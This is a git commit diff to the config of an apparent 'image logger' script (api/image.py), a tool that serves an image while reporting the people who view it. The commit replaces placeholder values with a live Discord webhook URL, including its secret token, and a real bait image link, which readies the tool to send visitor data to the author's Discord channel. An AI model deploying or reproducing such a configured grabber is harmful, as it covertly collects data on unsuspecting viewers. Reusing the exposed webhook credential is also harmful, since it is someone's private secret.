f3af2dd146914d727f4991dc0e9071a38b4fbc0b
hxnted-4103 <Montertico06@gmail.com>
2025-04-25 22:56:23 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1365429765275783188/yFLI5xu8jyXYfBJ4mp3K8o_4r7q1IkxXRT5av3QeEnB6eTcnyNjrcQYYks3hIipRKQ45",
+    "image": "https://bluemoji.io/cdn-proxy/646218c67da47160c64a84d5/64fae94caff88aa302cfd957_92.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
